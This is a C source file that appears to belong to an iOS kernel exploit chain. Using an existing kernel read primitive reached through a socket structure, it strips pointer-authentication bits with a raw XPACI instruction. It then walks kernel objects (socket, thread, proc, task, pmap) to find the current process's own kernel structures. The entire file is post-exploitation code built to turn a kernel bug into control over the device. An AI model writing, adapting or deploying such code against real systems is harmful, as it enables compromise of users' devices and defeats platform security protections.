#include "kmem.h"

#include "krw.h"

static uint64_t __attribute__((naked)) strip_pointer_auth(uint64_t value) {
    __asm(".long 0xDAC143E0");  // XPACI X0
    __asm("ret");
}

static bool read_pointer(uint64_t address, uint64_t* value) {
    if (!early_kread64_checked(address, value)) return false;
    if (!krw_is_kernel_address(*value)) *value = strip_pointer_auth(*value);
    return krw_is_kernel_address(*value);
}

uint64_t find_self_proc(void) {
    uint64_t socket = 0;
    uint64_t thread = 0;
    uint64_t thread_ro = 0;
    uint64_t proc = 0;
    if (!read_pointer(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_socket, &socket)) {
        LOG_ERR("self proc: RW socket lookup failed");
        return 0;
    }
    if (!read_pointer(socket + g_ctx.offsets.socket_so_background_thread, &thread)) {
        LOG_ERR("self proc: background thread lookup failed");
        return 0;
    }
    if (!read_pointer(thread + g_ctx.offsets.thread_t_ro, &thread_ro)) {
        LOG_ERR("self proc: thread_ro lookup failed");
        return 0;
    }
    if (!read_pointer(thread_ro + g_ctx.offsets.thread_ro_proc, &proc)) {
        LOG_ERR("self proc: proc lookup failed");
        return 0;
    }
    return proc;
}

uint64_t task_from_proc(uint64_t proc) {
    uint64_t proc_ro = 0;
    uint64_t task = 0;
    if (!krw_is_kernel_address(proc) || !read_pointer(proc + g_ctx.offsets.proc_p_ro, &proc_ro)) {
        LOG_ERR("self task: proc_ro lookup failed");
        return 0;
    }
    if (!read_pointer(proc_ro + g_ctx.offsets.proc_ro_task, &task)) {
        LOG_ERR("self task: task lookup failed");
        return 0;
    }
    return task;
}

uint64_t pmap_from_task(uint64_t task) {
    uint64_t task_map = 0;
    uint64_t pmap = 0;
    if (!krw_is_kernel_address(task) || !read_pointer(task + g_ctx.offsets.task_map, &task_map)) {
        LOG_ERR("self pmap: vm_map lookup failed");
        return 0;
    }
    if (!read_pointer(task_map + g_ctx.offsets.map_pmap, &pmap)) {
        LOG_ERR("self pmap: pmap lookup failed");
        return 0;
    }
    return pmap;
}
